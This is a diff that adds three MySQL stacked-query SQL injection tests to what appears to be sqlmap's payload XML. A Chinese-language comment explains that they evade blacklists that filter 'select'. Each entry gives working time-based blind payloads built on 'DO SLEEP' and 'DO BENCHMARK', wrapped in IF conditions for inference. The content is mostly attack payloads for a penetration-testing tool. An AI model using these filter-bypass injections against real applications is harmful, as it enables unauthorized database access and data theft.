@@ -87,4 +87,66 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
+    <!-- MySQL 堆叠补充（免 SELECT）：官方堆叠用例全部是 ;SELECT SLEEP/BENCHMARK，遇到过滤
+         select 关键字的目标（如 preg_match('/select|.../i') 黑名单）堆叠识别会整体漏检。
+         MySQL 的 DO 语句可执行表达式且不产生结果集，DO SLEEP/DO BENCHMARK 语义等价且不含
+         SELECT 关键字；vector 用 IF 包推断条件保持盲注语义。 -->
+    <test>
+        <title>MySQL &gt;= 5.0.12 stacked queries (DO SLEEP - comment)</title>
+        <stype>4</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;DO IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>;DO SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+    <test>
+        <title>MySQL &gt;= 5.0.12 stacked queries (DO SLEEP)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;DO IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+        <request>
+            <payload>;DO SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+    <test>
+        <title>MySQL stacked queries (DO BENCHMARK - comment)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;DO IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
+        <request>
+            <payload>;DO BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
 </root>
